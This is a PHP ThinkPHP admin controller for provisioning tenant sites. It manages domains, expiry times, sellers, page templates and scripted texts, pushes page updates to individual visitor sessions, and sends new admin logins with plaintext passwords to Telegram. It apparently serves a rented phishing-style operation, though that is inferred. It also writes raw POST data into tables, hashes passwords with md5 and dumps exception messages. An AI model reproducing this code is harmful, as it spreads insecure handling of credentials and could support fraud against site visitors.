<?php
namespace app\system\controller;

use think\Db;
use app\system\controller\Base;
use think\facade\Request;
use \GatewayWorker\Lib\Gateway;
use app\index\controller\Tg;
/**
* 总控数据操作类
*/
class User extends Base
{
	public $sql;

	public function __construct()
	{
		$this->sql = new \app\method\controller\Sql();
	}
	
	public function upWebsiteisdomain()
	{
	    $param = Request()->post();

		Db::name('web')->where(['id' => $param['id']])->update(['isdomain' => $param['isdomain']]);

		return result(200, getLang('10013'));
	}
	
	public function uptime()
	{
	    $param = Request::post();
	    
	    $num = $param['num'] * 3600 * 24;
	    
	    Db::name('web')->where(['id' => $param['wid']])->setInc('end_time',$num);
	    
	    return result(200, getLang(10023));
	}
	
	public function delweb()
	{
	    $id = Request()->get('id');
	    
	    try {
	        Db::name('web')->delete($id);
    	    Db::name('visitlog')->where(['wid' => $id])->delete();
    	    Db::name('uview')->where(['wid' => $id])->delete();
    	    Db::name('uspeech')->where(['wid' => $id])->delete();
    	    Db::name('domainlog')->where(['wid' => $id])->delete();
    	    Db::name('wadmin')->where(['wid' => $id])->delete();
    	    
    	    return result(200, getLang(10014));
	    } catch (\Exception $e) {
	        return result(200, getLang(10030));
	    }
	    
	    
	}
	
	 /**
     * 更新数据状态
     */
	public function upstatus()
	{
		$param = Request::post();

        if(empty($param['status']) || empty($param['oid']))
        {
            return result(201, 'error');
        }

        $res = Db::name('list')
        ->where(['id' => $param['oid']])
        ->update([

            'status' => $param['status']
        ]);

        if($res)
        {
            $speech = Db::name('uspeech')->where(['id' => $param['status']])->field('content,page,title')->find();
            $arr = [
                'page' => $speech['page'],
                'status' => $param['status'],
                'title' => $speech['title'],
                'content' => $speech['content']
            ];
            Gateway::sendToUid((int)$param['oid'], json_encode(['method' => 'update', 'data' => $arr]));
            return result(200, getLang(10013));

        }else{
            return result(201, getLang(10001));
        }
	}
	
	public function deldomain()
	{
		$param = Request()->post();

		Db::name('domainlog')->delete($param['wid']);

		return result(200, getLang('10014'));
	}

	public function addomain()
	{
		$param = Request()->post();

		$param['time'] = time();

		Db::name('domainlog')->insert($param);
		return result(200, getLang('10011'));
	}

	public function editspeech()
	{
		$param = Request()->post();
		$data = [
			'vid' => $param['view'],
			'name' => $param['name'],
			'title' => $param['title'],
			'content' => $param['content'],
			'page' => $param['page'],
// 			'vname' => $param['vname'],
            'sort' => $param['sort'],
			'time' => time()
		];

		Db::name('speech')->where(['id' =>$param['id']])->update($data);

		return result(200, getLang('10013'));
	}

	/*
	* 2023 5.15 添加站点
	*/
	public function addweb()
	{
		$param = Request()->post();

		Db::startTrans();

		try {
		    
		    $domain = explode('|', $param['domain']);
		    
			//组装站点信息
			$web = [
			    
                'suffix' => $param['suffix'],
				'start_time' => time(),
				'end_time' => time() + ($param['time'] * 60 * 60 * 24),
				'remarks' => $param['remarks'],
				'tgid' => $param['tgid'],
				'sendurl' => $domain[0]
			];

			$res = Db::name('web')->insertGetId($web);
			if(!$res)
			{
				Db::rollback();
				return result(201, getLang('10021'));
			}

			//组装 域名记录
			//$domain = explode('|', $param['domain']);
			$data = [];
			foreach($domain as $value){

				$data[] = ['wid' => $res, 'domain' => $value, 'time' => time()];
			}

			$wid = $res;
			$res = Db::name('wadmin')->insert(
				[
					'wid' => $wid,
					'user' => $param['user'],
					'pass' => md5($param['user'] . $param['pass'])

				]
			);
			if(!$res)
			{
				Db::rollback();
				return result(201, getLang('10021'));
			}

			$res = Db::name('domainlog')->insertAll($data);

			if(!$res)
			{
				Db::rollback();
				return result(201, getLang('10021'));
			}

			//组装 模板和话术
			$view = Db::name('view')->select();
			$speech = Db::name('speech')->field('id', true)->select();

			foreach ($view as $key => $value) {
				$view[$key]['wid'] = $wid;
				$view[$key]['vid'] = $value['id'];
				unset($view[$key]['id']);
			}

			foreach ($speech as $key => $value) {
				$speech[$key]['wid'] = $wid;
			}

			if(!Db::name('uview')->insertAll($view))
			{
				Db::rollback();
				return result(201, getLang('10021'));
			}
			
			if(!Db::name('uspeech')->insertAll($speech))
			{
				Db::rollback();
				return result(201, getLang('10021'));
			}
			
			if(!$res)
			{
				Db::rollback();
				return result(201, getLang('10021'));
			}

			Db::commit();
			
			/*
			* 组装返回信息
			* 后台地址 账号 密码 
			*/
			$ftxt = '<b>系统提醒：</b>&#10;';
			$ftxt .= '&#10;🎉您的站点开通成功！';
			$ftxt .= '&#10;&#10;后台地址: <code> http://a.' . $domain[0] . '/admin/login?token=' . $param['suffix'] . '</code>';
			$ftxt .= '&#10;账号：<code>' .$param['user']. '</code>';
			$ftxt .= '&#10;密码：<code>' .$param['pass']. '</code>';
			
			$tg = new Tg();
			$tg->send($param['tgid'], $ftxt);
			//var_dump($ftxt);die;
			
			return result(200, getLang('10015'));
		} catch(\Exception $e) {
			Db::rollback();
			//WriteExceptionInformation($e);
			return result(201, getLang('10021'));
		}	
	}


	public function delspeech()
	{
		$id = Request()->get('id');
		Db::name('speech')->delete($id);
		return result(200, getLang(10014));
	}

	public function editview()
	{
		$param = Request::post();
		try {
            $id = $param['param']['vid'];
            unset($param['param']['vid']);
            
            $config = Db::name('view')->where(['id' => $id])->value('config');
            $config = json_decode($config, true);
            foreach ($param['config'] as $k => $v)
            {
                $config[$k]['value'] = $v;
            }
            $param['param']['field'] = serialize($this->arraySetVal(explode('|',$param['param']['field'])));
            $param['param']['config'] = json_encode($config);
            Db::name('view')->where(['id' => $id])->update($param['param']);
            
            return result(200, getLang(10013));
        } catch (\Exception $e) {
        	var_dump($e->getMessage());die;
            return result(201, getLang(10040));
        }
		// $id = $data['vid'];
		// unset($data['vid']);
		// $data['time'] = time();
		// $data['status'] = 1;
		// $data['field'] = serialize($this->arraySetVal(explode('|',$data['field'])));
		// Db::name('view')->where(['id' => $id])->update($data);

		// return result(200, getLang('10013'));
	}

	public function Approved()
	{
		$id = Request()->get('id');
		Db::name('domain')->where(['id' => $id])->update(['status' => 1]);
		return result(200, getLang('10029'));
	}

	public function refuse()
	{
		$param = Request()->post();

		Db::name('domain')->where(['id' => $param['id']])->update(['status' => 0, 'details' => $param['details']]);

		return result(200, getLang('10029'));
	}

	public function upWebsiteStatus()
	{
		$param = Request()->post();

		Db::name('web')->where(['id' => $param['id']])->update(['status' => $param['status']]);

		return result(200, getLang('10013'));
	}

	public function delseller()
	{
		$id = Request::get('id');

		Db::name('seller')->delete($id);
		return result(200, getLang('10014'));
	}

	/**
	 * 添加域名后缀
	 */
	public function adddtype()
	{
		$param = Request()->post();

		Db::name('dtype')->insert($param);

		return result(200, getLang('10011'));
	}

	/**
	 * 编辑商户信息
	 */
	public function editseller()
	{
		$param = Request::post();
		$id = $param['id'];
		unset($param['id']);
		if(empty($param['pass']))
		{
			unset($param['pass']);
		}else{
			$param['pass'] = checkPass($param['pass'], $param['salt']);
		}

		unset($param['salt']);
		Db::name('seller')->where(['id' => $id])->update($param);
		return result(200, getLang('10013'));
	}

	/**
	 * 更新基础设置
	 * @return [type] [description]
	 */
	public function upconf()
	{
		$param = Request()->post();

		Db::name('config')->where('id', 1)->update($param);
		return result(200, getLang('10013'));
	}

	/**
	 * SetWebHook
	 * @return [type] [description]
	 */
	public function SetWebHook()
	{
		$param = Request()->post();

		$mail = new \app\method\controller\Mail();

		$res = $mail->setWebHook($param['weburl'], $param['webtoken']);

// 		var_dump($res);die;
		$res = json_decode($res,true);
		if(!empty($res['ok']) && $res['ok'] === true)
		{
			return result(200, getLang('10029'));
		}

		return result(201, getLang('10039'));
	}

	/**
	 * 添加话术
	 */
	public function inspeech()
	{
		$param = Request()->post();

		$data = [

			'vid' => $param['view'],
			'name' => $param['name'],
			'title' => $param['title'],
			'content' => $param['content'],
			'page' => $param['page'],
			'vname' => $param['vname'],
			'time' => time()
		];

		Db::name('speech')->insert($data);

		return result(200, getLang('10011'));
	}

	public function templist()
	{
		$param = Request::get();

		$order = DB::name('view')
		->select();

		$count = count($order);
		
		$order = Db::name('view')
		->order('time', 'desc')
		->limit($param['limit'])
		->page($param['page'])
		->select();

		//$list = $order->limit($param['limit'])->page($param['page']);
		$data = [

			'code' => 0,
			'msg' => '',
			'count' => $count,
			'data' => $order
		];

		return json($data);
	}

	public function addtemplate()
	{
		$data = Request::post();

		$data['time'] = time();
		$data['status'] = 1;
		$data['field'] = serialize($this->arraySetVal(explode('|',$data['field'])));
		Db::name('view')->insert($data);

		return result(200, getLang('10011'));
	}

	public function arraySetVal($arr)
	{
		$res = [];
		/*$i = 1;
		foreach ($arr as $key => $val) {
			$res[]['name'] = $val;
			$res[]['sort'] = $i;
			$res[]['status'] = 1;
			$i++;
		}*/
		for ($i=0; $i < count($arr); $i++) { 
			$res[$i]['name'] = $arr[$i];
			$res[$i]['sort'] = $i;
			$res[$i]['status'] = 1;
		}

		return $res;
	}



	public function uptemp()
	{
		$data = Request::post();

		$id = $data['id'];
		unset($data['id']);

		Db::name('view')->where(['id' => $id])->update($data);

		return result(200, getLang('10013'));
	}

	/**
	 * 删除模板
	 */
	public function delview()
	{
		$id = Request()->get('id');

		if(empty($id))
		{
			return result('201', getLang('10001'));
		}

		return $this->sql->delfind('view', $id);
	}
}